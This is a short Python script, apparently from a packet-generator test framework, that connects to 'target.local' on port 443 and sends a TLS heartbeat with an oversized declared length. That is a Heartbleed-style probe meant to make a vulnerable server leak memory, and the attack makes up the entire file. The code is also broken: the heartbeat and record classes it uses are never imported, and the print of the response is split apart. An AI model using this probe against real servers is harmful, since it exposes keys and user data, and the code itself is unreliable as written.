import scapy
import socket
import PacketGeneratorBase
from scapy.layers.tls.handshake import TLSClientHello, TLS13ClientHello


class PacketGenerator(PacketGeneratorBase):
    def generate(self):
        target = ('target.local', 443)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(target)

        p = TLSRecord(version="TLS_1_1") / TLSHeartBeat(length=2 ** 14 - 1, data='bleed...')

        s.sendall(p)
        resp = s.recv(1024)
        print
        "resp: %s" % repr(resp)
        s.close()
